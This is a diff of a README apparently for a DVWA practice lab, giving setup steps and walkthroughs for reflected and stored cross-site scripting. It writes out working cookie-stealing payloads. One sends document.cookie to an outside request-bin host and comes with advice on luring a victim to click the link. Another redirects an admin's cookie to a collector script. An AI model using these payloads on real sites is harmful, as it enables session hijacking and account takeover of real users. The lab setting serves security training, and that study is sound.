@@ -2,8 +2,8 @@
 ## 1. Installation
 - Move the directory "dvwa" and "mywebsite" to the xampp installation directory
 For example:
-E: \ xampp \ htdocs \ dvwa
-E: \ xampp \ htdocs \ mywebsite
+E:\ xampp\htdocs\dvwa
+E:\xampp\htdocs\mywebsite
 
 - Upload the file "dvwa.sql" to: http://localhost/phpmyadmin/
 
@@ -13,14 +13,15 @@ E: \ xampp \ htdocs \ mywebsite
 ### - XSS - Reflected
 + Identify website with XSS reflected error?
 + After determining that there are errors XSS Reflected. Send the link to the user. (The ability to seduce the victim depends on each person, assuming we can seduce the victim to click on the link)
-+ Insert the script: <script> document.write ('<IMG SRC = \ "https: //en3xwxviv17aq.x.pipedream.net? Cookie =' + document.cookie + '\"> Hello </IMG>'); </script>
++ Access to https://requestbin.com/ to Create request bin (In this example, my request bin is https://requestbin.com/r/en3xwxviv17aq)
++ Insert the script: <script>document.write('<IMG SRC=\"https://en3xwxviv17aq.x.pipedream.net?cookie='+document.cookie+'\">Hello</IMG>');</script>
 + View the cookie you just got and exploit that cookie
-(Go to https://requestbin.com to exploit the cookies you just grabbed)
+(Go to https://requestbin.com/r/en3xwxviv17aq to exploit the cookies you just grabbed)
 
 ### - XSS - Stored
 + Create 2 files: get.php (get cookie) and cookie.txt (empty to save her
 + Upload to site message will save to guestbook in database (dvwa.sql)
-+ Login as customer to insert code to get admin cookie: <script> window.location = "http: //localhost/mywebsite/get.php? cookie =" + document.cookie; </script>
++ Login as customer to insert code to get admin cookie: <script>window.location="http://localhost/mywebsite/get.php?cookie="+document.cookie;</script>
 
 + the link to the get.php file contains the code to get the cookie you just created
 + Now switch to the admin account
